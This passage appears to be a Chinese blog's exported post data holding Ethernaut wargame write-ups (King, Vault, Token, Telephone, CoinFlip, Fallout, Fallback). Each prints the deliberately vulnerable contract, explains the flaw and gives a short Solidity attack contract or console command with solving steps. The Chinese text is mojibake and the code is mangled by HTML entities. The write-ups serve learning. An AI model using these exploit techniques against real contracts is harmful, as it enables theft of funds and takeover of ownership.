é¢˜ç›®ï¼šä¸‹é¢çš„åˆçº¦è¡¨ç¤ºäº†ä¸€ä¸ªå¾ˆç®€å•çš„æ¸¸æˆ: ä»»ä½•ä¸€ä¸ªå‘é€äº†é«˜äºç›®å‰ä»·æ ¼çš„äººå°†æˆä¸ºæ–°çš„å›½ç‹. åœ¨è¿™ä¸ªæƒ…å†µä¸‹, ä¸Šä¸€ä¸ªå›½ç‹å°†ä¼šè·å¾—æ–°çš„å‡ºä»·, è¿™æ ·å¯ä»¥èµšå¾—ä¸€äº›ä»¥å¤ªå¸. çœ‹èµ·æ¥åƒæ˜¯åºæ°éª—å±€.è¿™ä¹ˆæœ‰è¶£çš„æ¸¸æˆ, ä½ çš„ç›®æ ‡æ˜¯æ”»ç ´ä»–, å½“ä½ æäº¤å®ä¾‹ç»™å…³å¡æ—¶, å…³å¡ä¼šé‡æ–°ç”³æ˜ç‹ä½. ä½ éœ€è¦é˜»æ­¢ä»–é‡è·ç‹ä½æ¥é€šè¿‡è¿™ä¸€å…³. 1.2 é¢˜ç›®ä»£ç ï¼š // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract King &#123; address king; uint public prize; address public owner; constructor() payable &#123; owner = msg.sender; king = msg.sender; prize = msg.value; &#125; receive() external payable &#123; require(msg.value &gt;= prize || msg.sender == owner); payable(king).transfer(msg.value); king = msg.sender; prize = msg.value; &#125; function _king() public view returns (address) &#123; return king; &#125; &#125; 1234567891011121314151617181920212223242526## 2. åˆ†æ### tipsï¼š[å‚è€ƒåšå®¢](https://stermi.medium.com/the-ethernaut-challenge-9-solution-king-ee9a689bcf0e)- 2.1 é˜…è¯»ä»£ç å¯çŸ¥ï¼Œè¯¥`receive`å‡½æ•°æ˜¯ä¸€ä¸ª**ç‰¹æ®Š**å‡½æ•°ï¼Œå…è®¸åˆçº¦ç›´æ¥ä»å¤–éƒ¨åˆçº¦æˆ– EOA æ¥æ”¶ä»¥å¤ªå¸- 2.2 æˆ‘ä»¬é¦–å…ˆçœ‹åˆ°çš„æ˜¯`require(msg.value &gt;= prize || msg.sender == owner)`ã€‚æ­¤æ£€æŸ¥å…è®¸`owner`åˆçº¦çš„ å§‹ç»ˆæ‹¥æœ‰åˆçº¦çš„ç‹æƒï¼Œé‡ç½®æ‰€æœ‰å€¼ã€‚- 2.3 æ‰€ä»¥ç°åœ¨æˆ‘ä»¬çŸ¥é“`transfer`å…è®¸æ‚¨å°† Ether å‘é€åˆ°ä¸€ä¸ªåœ°å€ï¼Œæ¶ˆè€—`2300`gas å¹¶åœ¨æ— æ³•æ‰§è¡Œäº¤æ˜“æ—¶**æ¢å¤ã€‚** å¦‚æœâ€œå°†ä»¥å¤ªå¸è½¬ç§»åˆ°â€äº¤æ˜“æ¢å¤ï¼Œä¸ºä»€ä¹ˆä¼šå‡ºç°é—®é¢˜ï¼Ÿå¥½å§ï¼Œå› ä¸ºå¦‚æœè¿˜åŸï¼Œæˆ‘ä»¬çš„åŠŸèƒ½`transfer`ä¹Ÿä¼š**è¿˜åŸï¼**å¹¶ä¸”é€šè¿‡è¿˜åŸå®ƒä¼šä½¿**åˆçº¦æ— æ³•ä½¿ç”¨**ï¼Œæ²¡æœ‰äººå¯ä»¥æˆä¸ºæ–°çš„å›½ç‹ï¼`receive` ä¸€ç§å¯èƒ½çš„è§£å†³æ–¹æ¡ˆæ˜¯åªåˆ›å»ºä¸€ä¸ª`Contract`ä¸æ¥å—ä»»ä½•ç±»å‹çš„ Ether è½¬ç§»çš„å¯¹è±¡ã€‚- 2.4 æ”»å‡»åˆçº¦- ```solidity contract Exploiter &#123; constructor(address payable _to) payable &#123; (bool success, ) = address(_to).call&#123;value: msg.value&#125;(&quot;&quot;); require(success, &quot;call failed!!!&quot;); &#125; &#125; 2.5 è·å–å®ä¾‹åœ°å€ï¼Œå¹¶å¡«å…¥åˆ°Exploiteråˆçº¦æ„é€ å™¨ä¸­ 3. è§£é¢˜ 3.1 è·å–å…³å¡å®ä¾‹åœ°å€ï¼š0x25766108F8Fa65C8061FB17E7762D4BC42Fc882C 3.2 è°ƒç”¨å…³å¡å®ä¾‹éƒ¨ç½²çš„åˆçº¦ï¼Œå¾—åˆ°å®ä¾‹åˆçº¦ä¸­çš„prize 3.3 æ ¹æ®å…³å¡å®ä¾‹åœ°å€éƒ¨ç½²æ”»å‡»åˆçº¦ 3.4 DeployåæŸ¥çœ‹kingçš„å€¼å‘ç”Ÿäº†æ”¹å˜ 3.5 æäº¤å®ä¾‹ 3.6 æˆåŠŸï¼ï¼ï¼ï¼ï¼","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Vault","slug":"Smart contracts/ethernaut/Vault","date":"2023-01-08T07:10:10.000Z","updated":"2023-01-08T07:10:10.000Z","comments":true,"path":"2023/01/08/Smart contracts/ethernaut/Vault/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/Smart%20contracts/ethernaut/Vault/","excerpt":"","text":"1.é¢˜ç›®è¦æ±‚ 1.1 è¦æ±‚ ï¼šæ‰“å¼€ vault æ¥é€šè¿‡è¿™ä¸€å…³! é¢˜ç›®ä»£ç ï¼š // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Vault &#123; bool public locked; bytes32 private password; constructor(bytes32 _password) &#123; locked = true; password = _password; &#125; function unlock(bytes32 _password) public &#123; if (password == _password) &#123; locked = false; &#125; &#125; &#125; 2. åˆ†æ 2.1 åœ¨åŒºå—é“¾ä¸Šä½¿ç”¨æˆ–å¼€å‘æ—¶ï¼Œé¦–å…ˆè¦è®°ä½çš„æ˜¯ï¼ŒåŒºå—é“¾ä¸­æ²¡æœ‰ä»»ä½•ä¸œè¥¿æ˜¯ç§æœ‰çš„ã€‚å³ä½¿æ‚¨å°†å˜é‡å£°æ˜ä¸ºprivateæˆ– ï¼Œä¹Ÿå¯ä»¥çœ‹åˆ°æ‰€æœ‰å†…å®¹internal 2.2 çŠ¶æ€å˜é‡å­˜å‚¨åœ¨åˆçº¦å­˜å‚¨ä¸­ï¼Œå› ä¸ºå˜é‡passwordæ˜¯ä¸€ä¸ª 32 å­—èŠ‚çš„æ•°æ®ï¼Œå®ƒæ€»æ˜¯ä¼šå¡«æ»¡æ•´ä¸ªæ§½ï¼Œä½¿å¾—å®ƒåœ¨åˆçº¦çš„ç¬¬äºŒä¸ªæ§½ä¸­çš„ä½ç½®éå¸¸å¯é¢„æµ‹ï¼Œå› ä¸ºç¬¬äºŒä¸ªçŠ¶æ€å˜é‡å®šä¹‰ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“åœ°ä½¿ç”¨web3.pygetstorageat()ä¸Šçš„åŠŸèƒ½ï¼Œé€šè¿‡åœ¨ç¬¬äºŒä¸ªå­˜å‚¨æ§½ä¸­æŸ¥æ‰¾æ¥æŸ¥çœ‹å¯†ç æ˜¯ä»€ä¹ˆã€‚ç„¶åæˆ‘ä»¬å¯ä»¥é€‰æ‹©å°†å…¶è½¬æ¢ä¸ºæ–‡æœ¬ä»¥æŸ¥çœ‹å¯†ç æ˜¯ä»€ä¹ˆã€‚ 2.3 åœ¨æµè§ˆå™¨æ§åˆ¶å°ä¸Šæ‰§è¡Œ * await web3.eth.getStorageAt(contract.address,1) * å‘½ä»¤ è·å–password ç„¶ååœ¨ å…³å¡å®ä¾‹éƒ¨ç½²çš„åˆçº¦ä¸Šè¾“å…¥è·å–åˆ°çš„ password 3. è§£é¢˜ 3.1 è·å–å…³å¡å®ä¾‹åœ°å€ï¼š0x3741430AB42C816Dbbe583001C9615049ad09e31 3.2 æ‰§è¡Œ *await web3.eth.getStorageAt(contract.address,1) * å¾—åˆ°password ï¼š0x412076657279207374726f6e67207365637265742070617373776f7264203a29 è°ƒç”¨å®ä¾‹éƒ¨ç½² çš„åˆçº¦,å¹¶è°ƒç”¨åˆçº¦çš„ unlock() å‡½æ•°ï¼š 3.3 å¯¹æ¯”è°ƒç”¨ unlock() å‡½æ•°ä¹‹ålocked çš„å€¼ 3.4 æäº¤æ¡ˆä¾‹å¹¶æŸ¥çœ‹ç»“æœ 3.5 æˆåŠŸï¼ï¼ï¼ï¼","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Token","slug":"Smart contracts/ethernaut/Token","date":"2023-01-08T06:30:10.000Z","updated":"2023-01-08T06:30:10.000Z","comments":true,"path":"2023/01/08/Smart contracts/ethernaut/Token/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/Smart%20contracts/ethernaut/Token/","excerpt":"","text":"Token1. é¢˜ç›®è¦æ±‚ 1.1 è¿™ä¸€å…³çš„ç›®æ ‡æ˜¯æ”»ç ´ä¸‹é¢è¿™ä¸ªåŸºç¡€ token åˆçº¦ 1.2 ä½ æœ€å¼€å§‹æœ‰20ä¸ª token, å¦‚æœä½ é€šè¿‡æŸç§æ–¹æ³•å¯ä»¥å¢åŠ ä½ æ‰‹ä¸­çš„ token æ•°é‡,ä½ å°±å¯ä»¥é€šè¿‡è¿™ä¸€å…³,å½“ç„¶è¶Šå¤šè¶Šå¥½ 1.3 åˆçº¦ä»£ç ï¼š // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Token &#123; mapping(address =&gt; uint) balances; uint public totalSupply; constructor(uint _initialSupply) public &#123; balances[msg.sender] = totalSupply = _initialSupply; &#125; function transfer(address _to, uint _value) public returns (bool) &#123; require(balances[msg.sender] - _value &gt;= 0); balances[msg.sender] -= _value; balances[_to] += _value; return true; &#125; function balanceOf(address _owner) public view returns (uint balance) &#123; return balances[_owner]; &#125; &#125; 1234567891011121314151617181920212223242526## 2. åˆ†æ- 2.1 ç¼–è¯‘å™¨ç‰ˆæœ¬ï¼š`^0.6.0`ï¼Œä¸”æ²¡ç”¨SafeMathåº“ï¼Œæ‰€ä»¥å¯èƒ½å‡ºç°æ•´æ•°æº¢å‡ºæ¼æ´- 2.2 ä»£ç åˆ†æï¼š- `require(balances[msg.sender] - _value &gt;= 0);`æ£€æŸ¥ç”¨æˆ·ä½™é¢æ˜¯å¦å¤§äºæˆ–ç­‰äºé›¶ï¼Œä½†ç”±äºä½™é¢æ˜¯æ— ç¬¦å·æ•´æ•°ï¼Œå½“æˆ‘ä»¬å‡å»çš„æ•°å­— ( `_value`) å¤§äºä»£`balances[msg.sender]`å¸çš„é’±åŒ…ä½™é¢ ( ) æ—¶ï¼Œå°±ä¼šå‘ç”Ÿæº¢å‡ºï¼Œé’±åŒ…ä½™é¢å˜ä¸ºæœ€å¤§æ— ç¬¦å·æ•´æ•°å‡å»è¿™ä¸¤ä¸ªå€¼ä¹‹é—´çš„å·®å€¼ã€‚ é€šè¿‡ require è¯­å¥åï¼Œè¿˜æœ‰ä¸€ä¸ªé”™è¯¯æ˜¯å°†è¿™ä¸ªæº¢å‡ºçš„å€¼èµ‹å€¼ç»™ çš„ä½™é¢`msg.sender`ï¼š- 2.3 æ”»å‡»åˆçº¦ï¼š- ```solidity contract Hack &#123; function attarck() public &#123; // å®ä¾‹åœ°å€ Token token = Token(0x03130C8ca692f8980461A9C96411aAf5e0A71AcB); // è‡ªå·±çš„é’±åŒ…åœ°å€ token.transfer(0x2DeF5505E8EfaD8dF16eFE1dFd8a49f52360b2e8,100); &#125; &#125; 2.4 è°ƒç”¨Hack åˆçº¦ä¸­çš„ attract() å‡½æ•° 3. è§£é¢˜ 3.1 è·å–å…³å¡å®ä¾‹åœ°å€ï¼š0x03130C8ca692f8980461A9C96411aAf5e0A71AcB 3.2 éƒ¨ç½²æ”»å‡»åˆçº¦ 3.3 æŸ¥çœ‹æˆ‘çš„é’±åŒ…åœ°å€çš„ä½™é¢ 3.4 å¼€å§‹åˆçº¦æ”»å‡»ï¼Œå¹¶æŸ¥çœ‹ä½™é¢ 3.5 æäº¤å®ä¾‹ï¼Œè¿”å›ç»“æœï¼ŒæˆåŠŸï¼ï¼ï¼","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Telephone","slug":"Smart contracts/ethernaut/Telephone","date":"2023-01-08T04:47:10.000Z","updated":"2023-01-08T04:47:10.000Z","comments":true,"path":"2023/01/08/Smart contracts/ethernaut/Telephone/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/Smart%20contracts/ethernaut/Telephone/","excerpt":"","text":"1. é¢˜ç›®è¦æ±‚ è¦æ±‚ï¼š è·å–åˆçº¦çš„æ‰€æœ‰æƒ åˆçº¦ä»£ç ï¼š 1234567891011121314151617// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Telephone &#123; address public owner; constructor() &#123; owner = msg.sender; &#125; function changeOwner(address _owner) public &#123; if (tx.origin != msg.sender) &#123; owner = _owner; &#125; &#125;&#125; 2. åˆ†æ 2.1 çŠ¶æ€ownerå˜é‡åœ¨constructorï¼Œå”¯ä¸€ä¼šæ›´æ–°ownerçš„å‡½æ•°æ˜¯ changeOwner(),å®ƒæ˜¯ä¸€ä¸ªåªæ¥å—ä¸€ä¸ªå‚æ•°çš„å…¬å…±å‡½æ•°address _ownerã€‚å¦‚æœtx.originå€¼ä¸åŒï¼Œmsg.senderå®ƒå°†ownerä½¿ç”¨å‡½æ•°è¾“å…¥å‚æ•°æ›´æ–°_ownerã€‚ 2.2 tx.origin() å’Œ msg.sender()çš„åŒºåˆ« tx.origin(address)ï¼š äº¤æ˜“çš„å‘é€æ–¹ï¼ˆå®Œæ•´çš„è°ƒç”¨é“¾ï¼‰è¿”å›çš„æ˜¯å·²å‘é€ï¼ˆåŸå§‹ï¼‰äº¤æ˜“çš„åœ°å€ msg.sender( address)ï¼šæ¶ˆæ¯çš„å‘é€è€…ï¼ˆå½“å‰é€šè¯ï¼‰è¿”å›çš„æ˜¯å‘èµ·å‘¼å«çš„å€¼externalï¼ˆåˆçº¦è°ƒç”¨è€…ï¼‰ ç”»å›¾åŒºåˆ†ï¼š 2.3 æ”»å‡»åˆçº¦ï¼š contract Hack &#123; function exploit(Telephone level) public &#123; level.changeOwner(msg.sender); &#125; &#125; 2.4 è°ƒç”¨Hack åˆçº¦ä¸­çš„ exploitï¼ˆï¼‰å‡½æ•°ï¼Œå½¢å‚æ˜¯å…³å¡çš„å®ä¾‹åœ°å€å°±ğŸ†—çš„ 3. è§£é¢˜ 3.1 è·å–å…³å¡çš„å®ä¾‹ï¼š0xf956A62d9BD792a712763aA21863d3025A5dd926 3.2 è°ƒç”¨å…³å¡åˆçº¦å¹¶éƒ¨ç½²æ”»å‡»åˆçº¦ 3.3 æŸ¥çœ‹åŸæ‹¥æœ‰ç€ï¼Œå¹¶è°ƒç”¨æ”»å‡»åˆçº¦ä¸­é¢exploit() å‡½æ•° 3.4 æäº¤å®ä¾‹å¹¶æŸ¥çœ‹ç»“æœ 3.5 æˆåŠŸï¼ï¼ï¼ï¼","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"CoinFlip","slug":"Smart contracts/ethernaut/CoinFlip","date":"2023-01-08T02:12:10.000Z","updated":"2023-01-08T02:12:10.000Z","comments":true,"path":"2023/01/08/Smart contracts/ethernaut/CoinFlip/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/Smart%20contracts/ethernaut/CoinFlip/","excerpt":"","text":"CoinFilp1. é¢˜ç›®è¦æ±‚è¿™æ˜¯ä¸€ä¸ªæ·ç¡¬å¸çš„æ¸¸æˆï¼Œä½ éœ€è¦è¿ç»­çš„çŒœå¯¹ç»“æœã€‚ å®Œæˆè¿™ä¸€å…³ï¼Œä½ éœ€è¦é€šè¿‡ä½ çš„è¶…èƒ½åŠ›æ¥è¿ç»­çŒœå¯¹åæ¬¡ã€‚ 2. åˆ†æ2.1 tipsï¼š å‚è€ƒè§†é¢‘ 2.2 _guess = uint256(blockhash(block.number.sub(1))).div(FACTOR) == 1 ? true : false2ï¼‰æˆ‘ä»¬çŸ¥é“ä¸èƒ½flip()åœ¨åŒä¸€ä¸ªå—ä¸­è°ƒç”¨å¤šæ¬¡ï¼›å¦åˆ™è¯¥åŠŸèƒ½å°†æ¢å¤ã€‚è¿™æ„å‘³ç€è¦é€šè¿‡æŒ‘æˆ˜ï¼Œæˆ‘ä»¬è‡³å°‘éœ€è¦çŒœå¯¹ 11 ä¸ªåŒºå— 2.3 æ”»å‡»åˆçº¦ï¼š contract Hack &#123; CoinFlip private immutable target; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor (address _target) &#123; target = CoinFlip(_target); &#125; function flip() external &#123; bool guess = _guess(); require(target.flip(guess),&quot;guess failed&quot;); &#125; function _guess() private view returns(bool) &#123; uint256 blockValue = uint256(blockhash(block.number - 1)); uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; return side; &#125; &#125; 2.3 è°ƒç”¨ 10æ¬¡ æ”»å‡»åˆçº¦çš„ flip() å‡½æ•° æ¥æ”¹å˜ CoinFilp åˆçº¦ä¸­ consecutiveWins çš„å€¼ 3. è§£é¢˜ 3.1 è·å–å…³å¡çš„å®ä¾‹ï¼š0x2F3D37ae048f36c8B2674aB1a4B8D3Bab4B6B716 3.2 åœ¨remixä¸­è°ƒç”¨å…³å¡åˆçº¦ 3.3 éƒ¨ç½²æ”»å‡»åˆçº¦ 3.5 è°ƒç”¨ 11æ¬¡ åˆçº¦ä¸­filp() å‡½æ•° 3.6 æäº¤å®ä¾‹å¹¶æŸ¥çœ‹ç»“æœ æˆåŠŸï¼ï¼ï¼","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Fallout","slug":"Smart contracts/ethernaut/Fallout","date":"2023-01-08T01:47:10.000Z","updated":"2023-01-08T01:47:10.000Z","comments":true,"path":"2023/01/08/Smart contracts/ethernaut/Fallout/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/Smart%20contracts/ethernaut/Fallout/","excerpt":"","text":"Fallout1.é¢˜ç›®è¦æ±‚è·å¾—ä»¥ä¸‹åˆçº¦çš„æ‰€æœ‰æƒæ¥å®Œæˆè¿™ä¸€å…³ 12345678910111213141516171819202122232425262728293031323334353637383940414243// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;contract Fallout &#123; using SafeMath for uint256; mapping (address =&gt; uint) allocations; address payable public owner; /* constructor */ function Fal1out() public payable &#123; owner = msg.sender; allocations[owner] = msg.value; &#125; modifier onlyOwner &#123; require( msg.sender == owner, &quot;caller is not the owner&quot; ); _; &#125; function allocate() public payable &#123; allocations[msg.sender] = allocations[msg.sender].add(msg.value); &#125; function sendAllocation(address payable allocator) public &#123; require(allocations[allocator] &gt; 0); allocator.transfer(allocations[allocator]); &#125; function collectAllocations() public onlyOwner &#123; msg.sender.transfer(address(this).balance); &#125; function allocatorBalance(address allocator) public view returns (uint) &#123; return allocations[allocator]; &#125;&#125; 2. åˆ†æ import &#39;openzeppelin-contracts-06/math/SafeMath.sol&#39;; 2.1 ç”±äºæ²¡æœ‰SafeMath.solæ–‡ä»¶åœ¨remixä¸­ï¼Œæ‰€ä»¥å¯ä»¥åœ¨remixä¸­å»ºç›¸åŒè·¯å¾„çš„æ–‡ä»¶å¤¹ 2.2 é˜…è¯»ä»£ç å¯çŸ¥ï¼Œåœ¨fal1out() å‡½æ•°ä¸­å¯ä»¥ä¿®æ”¹åˆçº¦çš„æ‰€æœ‰æƒï¼Œå³æˆåŠŸè°ƒç”¨fal1out()å‡½æ•°å³å¯ 3. è§£é¢˜ 3.1 è·å–å…³å¡å®ä¾‹åœ°å€ï¼š 0x578d3Fca5950E9CB155B91002FAe154796D05217 3.2 è°ƒç”¨å…³å¡åˆçº¦ 3.3 3.4 æŸ¥çœ‹åŸåˆçº¦æ‹¥æœ‰è€… 3.5 è°ƒç”¨Fal1out() å‡½æ•°ä¹‹åï¼Œå†æ¬¡æŸ¥çœ‹åˆçº¦çš„owner 3.6 æäº¤å®ä¾‹å¹¶æŸ¥çœ‹ç»“æœ æˆåŠŸï¼ï¼ï¼ï¼","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Fallback","slug":"Smart contracts/ethernaut/Fallback","date":"2023-01-07T08:47:10.000Z","updated":"2023-01-07T08:47:10.000Z","comments":true,"path":"2023/01/07/Smart contracts/ethernaut/Fallback/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/07/Smart%20contracts/ethernaut/Fallback/","excerpt":"","text":"Fallbacké¢˜è§£1. é¢˜ç›®è¦æ±‚â‘  è·å¾—è¿™ä¸ªåˆçº¦çš„æ‰€æœ‰æƒ â‘¡ æŠŠå®ƒçš„åˆçº¦ä½™é¢å‡åˆ°0 æç¤ºï¼š å¦‚ä½•é€šè¿‡ä¸ABIäº’åŠ¨å‘é€ether å¦‚ä½•åœ¨ABIä¹‹å¤–å‘é€ether è½¬æ¢ wei&#x2F;ether å•ä½ (å‚è§ help() å‘½ä»¤) Fallback æ–¹æ³• åˆçº¦ä»£ç ï¼š123456789101112131415161718192021222324252627282930313233343536373839404142// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Fallback &#123; mapping(address =&gt; uint) public contributions; address public owner; constructor() &#123; owner = msg.sender; contributions[msg.sender] = 1000 * (1 ether); &#125; modifier onlyOwner &#123; require( msg.sender == owner, &quot;caller is not the owner&quot; ); _; &#125; function contribute() public payable &#123; require(msg.value &lt; 0.001 ether); contributions[msg.sender] += msg.value; if(contributions[msg.sender] &gt; contributions[owner]) &#123; owner = msg.sender; &#125; &#125; function getContribution() public view returns (uint) &#123; return contributions[msg.sender]; &#125; function withdraw() public onlyOwner &#123; payable(owner).transfer(address(this).balance); &#125; receive() external payable &#123; require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0); owner = msg.sender; &#125;&#125; 2. åˆ†æ 2.1 è¯¥é¢˜çš„é¢˜çœ¼åœ¨äºï¼Œé€šè¿‡owner &#x3D; msg.senderè¯­å¥æŠŠåˆçº¦çš„æ‰€æœ‰æƒè®¾ç½®ä¸ºåˆçº¦è°ƒç”¨è€…ï¼Œè§‚å¯Ÿåˆ†æåˆçº¦å¯çŸ¥ï¼Œåœ¨contribute()æ–¹æ³•å’Œ receive() æ–¹æ³•ä¸­æ‹¥æœ‰è¯¥è¯­å¥ï¼Œä½†å¦‚æœæ‰§è¡Œcontribute() çš„è¯éœ€è¦è°ƒç”¨ 0.001 * 1000000 + 1æ¬¡ æ˜¾ç„¶è¿™æ ·çš„ä½œæ³•æ˜¯ä¸å¯å–çš„ï¼Œæ•… åªèƒ½é‡‡ç”¨receive()æ–¹æ³•æ¥å®ç° 2.2 receive()æˆåŠŸè°ƒç”¨çš„æ¡ä»¶æ˜¯ï¼Œè°ƒç”¨è€…çš„è´¡çŒ®å€¼å¤§äº0.001ether è¿˜ç”¨æ”¯ä»˜ &gt; 0çš„è´¹ç”¨ï¼Œæˆ‘ä»¬åªèƒ½é€šè¿‡è°ƒç”¨contribute()å‡½æ•°æ”¹å˜åˆçº¦è°ƒç”¨è€…çš„è´¡çŒ®å€¼ï¼Œæ”¹å¥½ä¹‹åå°±å¯ä»¥è°ƒç”¨åˆ°åˆçº¦çš„receive()å‡½æ•°ï¼Œå°±å¯ä»¥æˆä¸ºåˆçº¦çš„æ‹¥æœ‰è€… 2.3 æœ€åè°ƒç”¨withdraw() å‡½æ•°å°†åˆçº¦çš„é’±å…¨éƒ¨è½¬ç»™owner å³ï¼š 3.è§£é¢˜ 3.1 å…ˆä»é¢˜ç›®ä¸­è·å–å…³å¡çš„åœ°å€ï¼š 3.2 åˆ°remixä¸­ï¼Œå°†ç½‘ç»œå’Œè´¦æˆ·åˆ‡æ¢ä¸ºè‡ªå·±çš„é’±åŒ…è´¦æˆ·ï¼Œ 3.3 ç»™è‡ªå·±çš„é’±åŒ…è´¦æˆ·åŠ å…¥è´¡çŒ®å€¼ contributions 3.4 è°ƒç”¨receive() å‡½æ•°ï¼Œå®ç°è·å– åˆçº¦æ‰€æœ‰æƒæ“ä½œ 3.5 æŸ¥çœ‹å½“å‰åˆçº¦çš„owner 3.6 æœ€åè°ƒç”¨withdraw() å‡½æ•°ï¼Œå°†åˆçº¦çš„ä½™é¢å…¨éƒ¨è½¬å‡º 3.7 å›åˆ°é¢˜ç›®æäº¤å®ä¾‹ 3.8 è¿”å›ç»“æœï¼Œé€šè¿‡ï¼ï¼ï¼ï¼š","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"solidityç›¸å…³çŸ¥è¯†","slug":"Solidity/Basic_Knowledge/solidityç›¸å…³çŸ¥è¯†","date":"2023-01-01T08:47:10.000Z","updated":"2023-01-01T08:47:10.000Z","comments":true,"path":"2023/01/01/Solidity/Basic_Knowledge/solidityç›¸å…³çŸ¥è¯†/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/01/Solidity/Basic_Knowledge/solidity%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/","excerpt":"","text":"å®˜æ–¹æ–‡æ¡£Solidity_day01tips: ä¸€äº›é‡è¦çš„å±æ€§ å…¥é—¨é¡»çŸ¥ï¼š12345// SPDX-License-Identifier: MITpragma solidity ^0.8.4;contract HelloWeb3&#123; string public _string = &quot;Hello Web3!&quot;;&#125; ä»£ç è§£è¯»ï¼š ç¬¬ä¸€è¡Œæ˜¯æ³¨é‡Šï¼Œä¼šå†™ä¸€ä¸‹è¿™ä¸ªä»£ç æ‰€ç”¨çš„è½¯ä»¶è®¸å¯ï¼ˆlicenseï¼‰ï¼Œè¿™é‡Œç”¨çš„æ˜¯MIT licenseã€‚ å¦‚æœä¸å†™è®¸å¯ï¼Œç¼–è¯‘æ—¶ä¼šè­¦å‘Šï¼Œä½†ç¨‹åºå¯ä»¥è¿è¡Œã€‚solidity çš„æ³¨é‡Šæ˜¯ç”±â€&#x2F;&#x2F;â€œ å¼€å¤´ï¼Œåé¢è·Ÿæ³¨é‡Šçš„å†…å®¹ï¼ˆä¸ä¼šè¢«ç¨‹åºè¿è¡Œï¼‰ã€‚ 1// SPDX-License-Identifier: MIT ç¬¬äºŒè¡Œå£°æ˜æºæ–‡ä»¶æ‰€ç”¨çš„ solidity ç‰ˆæœ¬ï¼Œå› ä¸ºä¸åŒçš„ç‰ˆæœ¬è¯­æ³•æœ‰å·®åˆ«ã€‚è¿™è¡Œä»£ç å°†ä¸å…è®¸å°äº 0.8.4 ç‰ˆæœ¬ æˆ–è€… å¤§äº0.9.0ç‰ˆæœ¬çš„ç¼–è¯‘å™¨ç¼–è¯‘ï¼ˆç¬¬äºŒä¸ªæ¡ä»¶ç”± ^ æä¾›ï¼‰ã€‚Solidity 